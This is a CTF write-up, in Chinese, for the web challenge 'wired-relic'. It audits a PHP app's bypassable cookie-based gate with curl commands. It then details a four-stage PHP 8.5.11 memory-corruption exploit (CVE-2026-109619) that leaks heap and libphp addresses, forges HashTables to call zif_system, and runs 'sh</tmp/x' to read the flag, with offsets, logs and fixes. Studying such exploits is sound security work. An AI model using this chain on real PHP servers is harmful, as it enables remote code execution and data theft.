# Wired Relic — Writeup

- 赛事：TPCTF 2026 决赛（平台 CTFy）
- 题目：`wired-relic` / `AUTHORED-05510392`，Web，hard
- 附件：`AUTHORED-05510392.zip`，SHA-256 `f841bc4a71401411ce2f3b23be69b60dd4c7dce39f92b0a8e594154c43ce5781`
- 线上实例：`a98eb4f1-b6e0-4975-ad14-db645b774350`，服务 `http://{{INSTANCE_HOST}}:80/`
- **FLAG：`{{FLAG}}`**
- 平台校验：`{"correct":true,"solve_time_s":542.8,"solve_rank":51,"challenge_fully_solved":true,"ranked":true}`

---

## 1. 侦察

附件是"部署源码"，`README.txt:15-17` 明确说明运行节点用的就是这些文件，flag（ledger entry）由平台在启动时注入、不在压缩包里：

```
chal_5510/README.txt
chal_5510/source/Dockerfile
chal_5510/source/entrypoint.sh
chal_5510/source/apache/{mpm_prefork.conf, zz-relic.conf}
chal_5510/source/php/zz-relic.ini
chal_5510/source/html/{index.php, healthz.php, bay/index.php, console/index.php, deposit/index.php}
chal_5510/source/relic-lib/lib.php
```

部署画像（后面每一条都会变成利用条件）：

| 文件 | 关键内容 |
| --- | --- |
| `chal_5510/source/Dockerfile:1` | `FROM php:8.5.11-apache` |
| `chal_5510/source/apache/mpm_prefork.conf:4-9` | `StartServers 1`、`MinSpareServers 1`、`MaxSpareServers 1`、`MaxRequestWorkers 1`、`ServerLimit 1`、`MaxConnectionsPerChild 0` |
| `chal_5510/source/apache/mpm_prefork.conf:11` | `KeepAlive Off` |
| `chal_5510/source/php/zz-relic.ini:2` | `display_errors=On` |
| `chal_5510/source/php/zz-relic.ini:5` | `memory_limit=16M` |
| `chal_5510/source/php/zz-relic.ini:6-7` | `post_max_size=32M`、`upload_max_filesize=32M` |
| `chal_5510/source/php/zz-relic.ini:8` | `session.save_path=/tmp` |
| `chal_5510/source/php/zz-relic.ini:9` | `session.use_strict_mode=0` |
| `chal_5510/source/php/zz-relic.ini:11-12` | `session.upload_progress.enabled=On`、`cleanup=On` |
| `chal_5510/source/entrypoint.sh:12-15` | `cp /answers/flag /var/lib/relic/depot/chain/unit/ledger && chmod 0644` |
| `chal_5510/source/entrypoint.sh:17-18` | `console.key` 每次启动随机生成 |

站点结构：`html/index.php:13-17` 给出三个入口 `/console/`、`/deposit/`、`/bay/`，另有 `html/healthz.php`（`echo "ok"`）和只回一行 `bay ready` 的 `html/bay/index.php:1`。

线上探活（VPN 内 DNS）：

```console
$ curl -sS -i http://{{INSTANCE_HOST}}/bay/
HTTP/1.1 200 OK
Server: Apache              # ServerTokens Prod，隐藏版本
Content-Length: 10
bay ready
```

## 2. 应用层审计：为什么"公开账号永远读不到"

### 2.1 deposit 只能碰 `/tmp` + 1~8 字符小写名

`chal_5510/source/html/deposit/index.php`：

```php
9:  $namePattern = '/^[a-z][a-z0-9]{0,7}$/';
20: if (!preg_match($namePattern, $name)) { … 400 }
25: $path = '/tmp/' . $name;          // 硬拼，无拼接穿越
31: readfile($path);
43: if (!preg_match($namePattern, $name)) { … 400 }
48: if (strlen($content) > 2000 || strpos($content, "\0") !== false) { … 413 }
53: if (file_put_contents('/tmp/' . $name, $content) === false) { … 500 }
```

名字正则首字符必须是字母、总长 ≤8、`[a-z0-9]`，写不出 `../`、`.`、`_`、`/`；内容 ≤2000 且不能有 NUL。所以这个接口只能读写 `/tmp/<8 字符>`，既不能读 ledger，也不能写 `.htaccess`/`.user.ini` 之类（长度和字符集都不够，且 Apache 不读 /tmp 下的配置）。

### 2.2 arm 门槛是假的

`chal_5510/source/html/console/index.php:11-53` 的三步握手本身没有秘密：

```php
12: $nonce  = bin2hex(random_bytes(12));
13: $ticket = bin2hex(random_bytes(8));
14: relic_send_state(['s' => 'open', 'n' => $nonce, 'e' => time() + 600]);
…
33: 'challenge' => hash('sha256', $state['n'] . ':' . $ticket),
…
47: $challenge = hash('sha256', $state['n'] . ':' . $ticket);
48: if (!hash_equals($challenge, $proof)) { … 403 }
51: relic_send_state(['s' => 'armed', 'n' => $state['n'], 'e' => time() + 1800]);
```

而 `chal_5510/source/relic-lib/lib.php:42-46` 的 cookie 是"明文 JSON + HMAC"，不是加密：

```php
44: $body = relic_b64u(json_encode($payload, JSON_UNESCAPED_SLASHES));
45: return 'v1.' . $body . '.' . hash_hmac('sha256', 'v1.' . $body, relic_key());
```

所以 nonce 直接可从自己的 `relic_state` cookie 解出来，`refresh` 又把 challenge 原样返回，`arm` 的 proof 等于白送。实测流程（本地/线上一致）：

```console
$ curl -s -c j -b j -X POST -d action=open  http://host/console/index.php
{"status":"pending","ticket":"585276b3d5359eff","instruction":"…"}
# cookie: relic_state=v1.eyJzIjoib3BlbiIsIm4iOiIwOTk4YWJh…fQ.<hmac>
$ curl -s -c j -b j 'http://host/console/index.php?action=refresh&ticket=585276b3d5359eff'
{"status":"pending","challenge":"9d0c…"}
$ curl -s -c j -b j -X POST -d action=arm -d ticket=585276b3d5359eff -d proof=9d0c… http://host/console/index.php
{"status":"armed","note":"handoff scratch area released"}
$ curl -s -c j -b j -X POST -d action=leave -d name=x -d content='id' http://host/deposit/index.php
left
$ curl -s -c j -b j 'http://host/deposit/index.php?read=x'
id
```

### 2.3 结论

- ledger 在 `entrypoint.sh:13` 被放到 **docroot 之外**：`/var/lib/relic/depot/chain/unit/ledger`（docroot 是 `/var/www/html`，`/var/lib/...` 不可通过 URL 访问，应用里也没有文件读取原语）。
- 应用没有 `include`/`require` 用户输入、没有 `unserialize`、没有 `eval`、没有命令执行、没有 symlink 原语；`readfile('/tmp/'.$name)` 连 glob 都没有。
- 唯一"门"是 `arm`，而 arm 不设防 → 应用层到此为止，必须换层面。

题目描述里 "the public console account never had a way to read it" 就是明示：应用层无解。

## 3. 配置即漏洞：PHP2Shell（CVE-2026-109619）

`Dockerfile:1` 钉死 `php:8.5.11-apache`，而同一家族漏洞在 PHP 8.5.12 被 "Avoid state corruption via bailout" 修掉；再对照 ini/prefork：

| 利用前置条件 | 本题取值 | 位置 |
| --- | --- | --- |
| 存在 UAF/状态污染的 PHP 版本 | 8.5.11 | `Dockerfile:1` |
| 单 worker 长生命周期（跨请求复用同一进程） | `MaxRequestWorkers 1`、`MaxConnectionsPerChild 0` | `mpm_prefork.conf:7,9` |
| `session.upload_progress.enabled=On` | On | `zz-relic.ini:11` |
| `session.save_path=/tmp`（与 upload_progress 的临时文件同目录，可预测/可碰撞） | `/tmp` | `zz-relic.ini:8` |
| `session.use_strict_mode=0`（可注入任意 SID） | 0 | `zz-relic.ini:9` |
| `display_errors=On`（错误回显便于观测） | On | `zz-relic.ini:2` |
| 无 `open_basedir` / 无 `LimitRequestBody` | 都没有 | `zz-relic.ini` 全 13 行 |

而且**应用自己不需要调用 `session_start()`**：`session.upload_progress` 由 multipart 里的 `PHP_SESSION_UPLOAD_PROGRESS` 字段触发，session 模块会自动读写 `/tmp/sess_<id>`，这正是能让 `$_SESSION` 的 `http_session_vars` 状态残留到下一个请求的入口。

一句话：出题人把 CVE-2026-109619 的每一条前置条件都写进了部署配置，`zz-relic.ini` 就是 exploit 说明书。

## 4. 四阶段利用链

参考实现：`_dl/php2shell/exploit.py`（社区 PoC），本题在 `_dl/relic_solve.py` 里做了参数化和应用层封装。

### 4.1 常量（在本镜像上核对过）

```text
libphp.so sha256  2c80ca2a245ca1ccca9946f30ebeca210b9689bc24f2bd07eda717d70108ee5d
                  与容器内 /usr/lib/apache2/modules/libphp.so 完全一致
zif_system        libphp + 0x5996e0     (PHP 内部符号，按 8.5.11 构建固定)
zval_ptr_dtor     libphp + 0x7b47a0     (nm -D 可导出核对)
fake HashTable    chunk  + 0xB3018
```

### 4.2 阶段 1：泄 Zend MM chunk 基址

- 先发一个 6MB 的 `big` 字段请求把 `memory_limit=16M` 打爆，触发 OOM bailout；
- bailout 过程中 `$_SESSION` 的 `PS(id)` 变成悬垂指针，下一个请求里被 `url_encode`/`Set-Cookie` 序列化时发生越界读；
- 响应里的 `Set-Cookie: PHPSESSID=<二进制>` 中出现大量堆指针，按 2MB 对齐取众数（≥8 次命中）即 chunk base。

实测泄露（线上）：

```
Set-Cookie: PHPSESSID=LAAAA…%C6WC%2B%3Ey%8F%B6%A0p%EA%E6%60%7D%00%00VVVV…
[*] chunk = 0x7d60e6e00000
```

### 4.3 阶段 2：泄 libphp 基址

- 继续用 56 字节 HashTable 页做堆布局，让 `PS(id)+0x18`（`nNextFreeElement|pDestructor`）落在可读位置；
- 读到 `pDestructor`（`zval_ptr_dtor`）后减偏移即 libphp base（4KB 对齐校验）。

```
Set-Cookie: PHPSESSID=%10%00…%A0G%1B%E9%60%7D%00%00; path=/
[*] libphp = 0x7d60e8a00000       # 0x…1b47a0 - 0x7b47a0
```

### 4.4 阶段 3：伪造 zend_reference → 任意调用

- 用 899 个 39 字节的 session 变量做"载体"，在偏移 8 处放伪造 `zend_reference`：`struct.pack('<IIQQ', 1, 0x1A, htdata, 0x307)`；
- 再放 15 份 167 字节的伪造 HashTable，`pDestructor` 指向 `zif_system`，`htdata = chunk + 0xB3018`；
- 触发 `zend_array_destroy(fake HashTable)` → 以 `pDestructor` 作为函数指针调用 → RCE（www-data）。

载荷长度被 167 字节 HashTable 卡死：`167 - 0x98 - 1 = 14` 字节，**命令上限 14 字节**。

### 4.5 14 字节 vs 43 字节路径

要读的路径 `/var/lib/relic/depot/chain/unit/ledger` 有 43 字节，塞不进 carrier。解法是把两边接起来：

1. 应用层 `POST /deposit/index.php action=leave name=x content=<脚本>` 写 `/tmp/x`（≤2000 字节，够写 221 字节脚本）；
2. RCE 只执行 9 字节的 `sh</tmp/x`；
3. 脚本把 ledger `cat` 到 `/tmp/y`；
4. 应用层 `GET /deposit/index.php?read=y` 把结果读回来。

`/tmp/x` 内容（脚本自动生成）：

```sh
{ id; uname -a; } > /tmp/y 2>&1
ls -la /var/lib/relic/depot/chain/unit >> /tmp/y 2>&1
for f in /var/lib/relic/depot/chain/unit/ledger /answers/flag /flag; do
  if [ -r "$f" ]; then cat "$f" >> /tmp/y 2>&1; break; fi
done
```

## 5. 利用脚本

`_dl/relic_solve.py`（195 行）：

- `class App`：`arm()`（open→refresh→arm，自动带 cookie）、`leave(name, content)`、`read(name)`；
- `run_exploit(url, cmd, huge=6, pads=6, tokens=899, vlen=39, refoff=0x8, ht=0xB3018)`：
  `rotate()` → `stage1()` → `rotate()` → `stage2()` → **A**（6 个 31 字节 pad + 文件段 + 6MB 大字段，打爆内存留下悬垂 PS(id)）→ **B**（899 个带 fake ref 的 token + 15 份 fake HashTable + `PHP_SESSION_UPLOAD_PROGRESS` 放最后）；
- 三段式重试（每段前 `rotate()` 换 worker），ZIF/DTOR/HT 作为参数可覆盖。

用法：

```console
py -3 _dl/relic_solve.py http://<host>:<port>          # 默认 sh</tmp/x
py -3 _dl/relic_solve.py http://<host>:<port> --cmd 'id>/tmp/y'
```

## 6. 线上实战

### 6.1 找实例

平台 API（团队 token + `X-Ctfy-Client: web`）：

```console
GET https://ctfy.io/api/v1/instances?competition_id=f6fe5aa91a8a42858f25d61758dfefaf
→ items[2] = {id: a98eb4f1-…, name: "wired-relic", challenge_id: AUTHORED-05510392,
               services: [{host: {{INSTANCE_HOST}}, port: 80, service_type: http}]}
```

`.internal` 域名只在 WireGuard 内可解析，`/bay/` 返回 `bay ready` 即连通。

### 6.2 第一次失败 → 插桩定位

首跑三轮全灭：

```
[*] attempt 1: rotate
[-] stage1 failed
[*] attempt 2: rotate
[*] chunk  = 0x7d60e6e00000
[-] stage2 failed
[*] attempt 3: rotate
[-] stage1 failed
```

`/tmp/y` 404（说明 RCE 没发生，不是脚本问题）。写 `_dl/relic_debug.py` 插桩复跑，打印每轮 cookie 长度、`[8:16]`、候选基址、请求耗时：

```
[*] stage1 round 0
    post1 done in 14.2s          # 6MB 走 VPN
    [stage1] cookie bytes = 4096
    chunk = 0x7d60e6e00000
[*] stage2
    libphp = 0x7d60e8a00000
```

两个泄漏阶段首轮就命中 → 链没问题，首跑失败是**单 worker 冷启动/堆状态抖动**的偶发（本地 4/4 一次成功，线上 RTT 与队列时序不同）。结论：多跑几次，脚本的重试就是为此准备的。

### 6.3 第二轮一次成功

```
[*] arming slot
[*] writing /tmp/x (221 bytes)
    leave -> 200 left
[*] carrier command (9 bytes): 'sh</tmp/x'
[*] attempt 1: rotate
[*] chunk  = 0x7d60e6e00000
[*] libphp = 0x7d60e8a00000
[*] htdata = 0x7d60e6eb3018  zif = 0x7d60e8f996e0
[*] B response 0 bytes               # worker 执行完命令后自杀
[*] exploit done ok=True
[*] read /tmp/y -> 200 'uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 1ed1cd124789 7.0.0-38-generic #38-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 09:10:14 UTC 2026 x86_64 GNU/Linux
total 12
drwxr-xr-x 2 root root 4096 Nov 22 07:47 .
drwxr-xr-x 3 root root 4096 Nov 22 07:47 ..
-rw-r--r-- 1 root root   38 Nov 22 07:47 ledger
{{FLAG}}'
```

复核：再次 `arm` + `read=y` 内容一致；容器 hostname `1ed1cd124789`、内核 `7.0.0-38-generic` 与本地 lab 不同，确认是线上实例。

平台提交：

```console
POST https://ctfy.io/api/v1/submissions
{"instance_id":"a98eb4f1-…","question_id":"flag","answer":"{{FLAG}}"}
→ {"correct":true,"solve_time_s":542.8,"solve_rank":51,"challenge_fully_solved":true,"ranked":true}
```

## 7. 本地复现

```console
# 1) 构建与题目完全一致的镜像
$ cd chal_5510/source
$ docker build -t relic-lab:latest .
$ docker run -d --name relic-lab -p 18210:80 relic-lab:latest

# 2) 模拟平台注入 ledger（git-bash 必须加 MSYS_NO_PATHCONV=1，否则 /answers 被改写）
$ MSYS_NO_PATHCONV=1 docker exec relic-lab sh -c 'mkdir -p /answers && echo "{{FLAG}}" > /answers/flag && cp /answers/flag /var/lib/relic/depot/chain/unit/ledger'

# 3) 跑利用
$ py -3 _dl/relic_solve.py http://127.0.0.1:18210
[*] read /tmp/y -> 200 'uid=33(www-data) …\n-rw-r--r-- 1 root root 18 … ledger\n{{FLAG}}\n'
```

可靠性：同一容器冷重启 3 次 + 全新容器 1 次，**4/4 一次成功**（每次约 20s）。

## 8. 排查表

| 现象 | 原因 / 处理 |
| --- | --- |
| `stage1 failed` | 首选偶发（单 worker 冷启动）。重跑；持续失败再查镜像是否 8.5.11、`upload_progress` 是否 On、前置代理是否限 body。用 `_dl/relic_debug.py <url>/index.php 3` 看 cookie 长度/候选基址/耗时 |
| `stage2 failed` | 通常上一轮堆没清干净 → 脚本会 `rotate()` 再试；连续失败说明 `zval_ptr_dtor` 偏移不匹配 |
| `read y` 404 但 B 没崩 | 命令没执行：先用 `--cmd 'id>/tmp/y'` 验证函数指针，再查 `--ht` |
| 413 / 连接重置 | 中间代理限 body：`--huge` 降到 5/4（会改变堆布局，可能需配合调 `--ht`） |
| `deposit` 403 | arm 过期（1800s）或 worker 轮换换了 cookie，脚本会自动重新 arm |
| `no such note` | 名字不合法或文件不存在；`read` 参数必须是 `^[a-z][a-z0-9]{0,7}$` |

## 9. 修复建议

1. **升级 PHP ≥ 8.5.12**（或打 "Avoid state corruption via bailout" 补丁）——根因。
2. 别在同一长生命周期 worker 里复用跨请求堆状态：`MaxConnectionsPerChild` 设小值、或每请求重启（本题目的是单 worker 稳定，恰好帮了攻击者）。
3. `open_basedir=/var/www/html:/tmp`，`LimitRequestBody` 限小，`session.upload_progress` 只在需要时开。
4. ledger 做权限隔离：`chmod 0600 root:root`，别让 www-data 可读；更好的做法是放到 web 账号完全无权访问的目录/独立服务。
5. 别把"签名 cookie"当访问控制：`arm` 的 challenge 由服务器返回给客户端，等于没有证明力；状态机应在服务端存储并绑定会话。

## 10. 文件清单

- `chal_5510/source/` — 题面部署源码（本题审计对象）
- `chal_5510/SOLVE.md` — 逐步解题记录（含本地/线上命令与输出）
- `_dl/relic_solve.py` — 本题一键利用脚本
- `_dl/relic_debug.py` — 插桩版 stage1/stage2 探测工具
- `_dl/php2shell/exploit.py` — PHP2Shell 参考实现（四阶段、profile 参数化）
- `_dl/widen.py` — 放宽 cookie 泄露地址过滤（本机映射在 0x6xxx–0x8xxx）
